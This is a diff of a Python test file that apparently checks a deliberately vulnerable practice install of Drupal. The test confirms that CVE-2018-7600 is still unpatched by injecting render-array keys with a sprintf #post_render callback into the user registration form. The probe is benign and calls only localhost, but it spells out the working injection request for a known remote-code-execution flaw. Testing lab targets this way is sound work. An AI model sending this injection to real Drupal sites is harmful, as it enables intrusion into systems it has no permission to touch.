@@ -290,9 +290,11 @@ def test_d_user_register_form_reachable_anonymously(goat: Goat) -> None:
 def test_d_render_array_injection_on_register_still_works(goat: Goat) -> None:
     """CVE-2018-7600 is unpatched: the form API evaluates render-array keys sent by a visitor.
 
-    The probe only reverses a random marker with PHP's strrev; it runs no command.
+    The probe runs no command. Drupal calls each #post_render callback with two
+    arguments (the rendered text and the element array), so the callback is PHP's
+    sprintf: the text is its format string and the array becomes the word "Array".
     """
-    marker = secrets.token_hex(8)
+    prefix, suffix = secrets.token_hex(6), secrets.token_hex(6)
     url = (
         "http://127.0.0.1/user/register?element_parents=account/mail/%23value"
         "&ajax_form=1&_wrapper_format=drupal_ajax"
@@ -304,11 +306,11 @@ def test_d_render_array_injection_on_register_still_works(goat: Goat) -> None:
         assert code == 0, out
         return out
 
-    base = ("form_id=user_register_form", "_drupal_ajax=1", f"mail[#markup]={marker}")
-    probed = post(*base, "mail[#type]=markup", "mail[#post_render][]=strrev")
-    assert marker[::-1] in probed, probed[:300]
-    # the same request without the injected keys never reverses the marker
-    assert marker[::-1] not in post(*base)
+    base = ("form_id=user_register_form", "_drupal_ajax=1", f"mail[#markup]={prefix}%s{suffix}")
+    probed = post(*base, "mail[#type]=markup", "mail[#post_render][]=sprintf")
+    assert f"{prefix}Array{suffix}" in probed, probed[:300]
+    # the same request without the injected keys never produces the filled-in text
+    assert f"{prefix}Array{suffix}" not in post(*base)
 
 
 def test_d_content_pack_counts(goat: Goat) -> None:
